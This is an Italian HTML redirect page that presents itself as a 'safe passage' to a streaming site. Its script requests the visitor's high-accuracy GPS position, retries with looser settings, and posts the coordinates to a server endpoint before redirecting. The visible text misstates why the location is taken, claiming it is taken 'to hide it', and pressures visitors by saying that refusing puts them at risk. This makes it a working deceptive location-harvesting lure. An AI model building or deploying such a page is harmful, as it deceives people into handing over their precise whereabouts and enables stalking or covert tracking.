<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="color-scheme" content="light" />
  <title>Continua al collegamento</title>
  <style>
    * { box-sizing: border-box; }

    :root {
      --bg: #f5f7fb;
      --surface: rgba(255,255,255,.92);
      --text: #111827;
      --muted: #667085;
      --line: rgba(17,24,39,.08);
      --accent: #111827;
      --accent-hover: #1f2937;
      --ring: rgba(17,24,39,.14);
      --shadow: 0 24px 70px rgba(15,23,42,.10);
    }

    html { min-height: 100%; }

    body {
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      display: grid;
      place-items: center;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      color: var(--text);
      background:
        radial-gradient(circle at 15% 15%, rgba(99,102,241,.08), transparent 28%),
        radial-gradient(circle at 85% 85%, rgba(59,130,246,.07), transparent 30%),
        var(--bg);
      -webkit-font-smoothing: antialiased;
    }

    .shell { width: min(100%, 480px); }

    .card {
      padding: clamp(28px, 6vw, 42px);
      border: 1px solid var(--line);
      border-radius: 26px;
      background: var(--surface);
      box-shadow: var(--shadow);
      backdrop-filter: blur(18px);
      -webkit-backdrop-filter: blur(18px);
    }

    .icon {
      width: 54px;
      height: 54px;
      display: grid;
      place-items: center;
      margin-bottom: 24px;
      border-radius: 17px;
      background: #f2f4f7;
      color: #344054;
    }

    .icon svg { width: 25px; height: 25px; display: block; }

    .eyebrow {
      margin: 0 0 8px;
      color: #667085;
      font-size: .76rem;
      font-weight: 750;
      letter-spacing: .12em;
      text-transform: uppercase;
    }

    h1 {
      margin: 0;
      font-size: clamp(2rem, 7vw, 3rem);
      line-height: 1.02;
      letter-spacing: -.045em;
      font-weight: 780;
    }

    .intro {
      margin: 16px 0 0;
      color: var(--muted);
      font-size: 1rem;
      line-height: 1.65;
    }

    .actions { margin-top: 28px; }

    button {
      width: 100%;
      min-height: 54px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 14px 20px;
      border: 0;
      border-radius: 15px;
      font: inherit;
      font-weight: 700;
      color: white;
      background: var(--accent);
      box-shadow: 0 10px 22px rgba(17,24,39,.16);
      cursor: pointer;
      transition: transform 160ms ease, background 160ms ease, box-shadow 160ms ease;
    }

    button:hover:not(:disabled) {
      transform: translateY(-1px);
      background: var(--accent-hover);
      box-shadow: 0 14px 28px rgba(17,24,39,.19);
    }

    button:active:not(:disabled) { transform: translateY(0); }
    button:focus-visible { outline: 4px solid var(--ring); outline-offset: 3px; }
    button:disabled { opacity: .65; cursor: wait; box-shadow: none; }

    .notice {
      margin: 14px 2px 0;
      display: flex;
      gap: 8px;
      align-items: flex-start;
      color: var(--muted);
      font-size: .82rem;
      line-height: 1.5;
    }

    .notice svg {
      width: 16px;
      height: 16px;
      flex: 0 0 auto;
      margin-top: 2px;
    }

    #status {
      margin-top: 18px;
      min-height: 0;
      color: #344054;
      font-size: .92rem;
      line-height: 1.55;
    }

    #status:empty { display: none; }

    #status:not(:empty) {
      padding: 14px 16px;
      border: 1px solid var(--line);
      border-radius: 14px;
      background: #f8fafc;
      animation: status-in 180ms ease-out;
    }

    #status a {
      display: inline-block;
      margin-top: 4px;
      color: #1d4ed8;
      font-weight: 700;
      text-decoration: none;
    }

    #status a:hover { text-decoration: underline; text-underline-offset: 3px; }
    .small { color: var(--muted); }

    @keyframes status-in {
      from { opacity: 0; transform: translateY(4px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @media (max-width: 560px) {
      body { padding: 14px; place-items: end center; }
      .shell { width: 100%; }
      .card { padding: 30px 24px; border-radius: 23px; }
    }

    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after {
        animation-duration: .01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: .01ms !important;
      }
    }
  </style>
</head>
<body>
  <div class="shell">
    <main class="card">
      <div class="icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M8 7h9m0 0-3-3m3 3-3 3M16 17H7m0 0 3 3m-3-3 3-3" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>

      <p class="eyebrow">Passaggio sicuro</p>
      <h1>Stai per continuare.</h1>
      <p class="intro">Prima di proseguire, questa pagina prenderà la tua posizione per nasconderla. Il browser ti chiederà conferma.</p>

      <div class="actions">
        <button id="shareBtn" type="button">Continua</button>
        <p class="notice">
          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
            <path d="M12 9v4m0 4h.01M10.3 4.9 3.6 17a2 2 0 0 0 1.75 3h13.3a2 2 0 0 0 1.75-3L13.7 4.9a2 2 0 0 0-3.4 0Z" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          Continuando, puoi autorizzare o rifiutare la richiesta di posizione dal browser. Rifiutarla comporta esporti a tuo rischio.
        </p>
      </div>

      <div id="status" class="small" role="status" aria-live="polite"></div>
    </main>
  </div>

  <script>
    "use strict";

    const btn = document.getElementById("shareBtn");
    const statusEl = document.getElementById("status");

    function setStatus(message) {
      statusEl.replaceChildren(document.createTextNode(message));
    }

    function showSuccess(result, accuracy) {
      statusEl.replaceChildren();

      const text = document.createTextNode(
        `Posizione condivisa con successo. Precisione stimata: circa ${Math.round(accuracy)} m. `
      );
      const link = document.createElement("a");
      link.href = result.maps_url;
      link.target = "_blank";
      link.rel = "noopener noreferrer";
      link.textContent = "Apri la posizione su Google Maps";

      statusEl.append(text, link);
    }

    async function sendPosition(position) {
      const payload = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy_meters: position.coords.accuracy,
        timestamp: new Date(position.timestamp).toISOString()
      };

      const response = await fetch("/api/location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        credentials: "same-origin",
        cache: "no-store",
        body: JSON.stringify(payload)
      });

      const result = await response.json().catch(() => ({}));
      if (!response.ok || result.ok !== true || typeof result.maps_url !== "string") {
        throw new Error(result.error || `Errore HTTP ${response.status}`);
      }

      showSuccess(result, payload.accuracy_meters);
    }

    function getPosition(options) {
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, options);
      });
    }

    btn.addEventListener("click", async () => {
      if (!window.isSecureContext) {
        setStatus("La geolocalizzazione richiede una connessione HTTPS sicura.");
        return;
      }

      if (!("geolocation" in navigator)) {
        setStatus("La geolocalizzazione non è supportata da questo browser.");
        return;
      }

      btn.disabled = true;
      setStatus("Richiesta della posizione in corso…");

      try {
        let position;
        try {
          position = await getPosition({
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
          });
        } catch (firstError) {
          // Se il GPS ad alta precisione non risponde in tempo, prova una volta
          // con una localizzazione più permissiva prima di mostrare l'errore.
          if (firstError && (firstError.code === 2 || firstError.code === 3)) {
            setStatus("Riprovo con una modalità di localizzazione più compatibile…");
            position = await getPosition({
              enableHighAccuracy: false,
              timeout: 12000,
              maximumAge: 30000
            });
          } else {
            throw firstError;
          }
        }

        await sendPosition(position);
        window.location.assign("https://streamingsugo.netlify.app");
      } catch (error) {
        if (error && typeof error.code === "number") {
          const messages = {
            1: "Permesso alla posizione negato.",
            2: "Posizione non disponibile.",
            3: "Tempo scaduto durante la ricerca della posizione."
          };
          setStatus(messages[error.code] || "Errore durante la geolocalizzazione.");
        } else {
          setStatus("Posizione ottenuta, ma non è stato possibile inviarla al server.");
        }
      } finally {
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
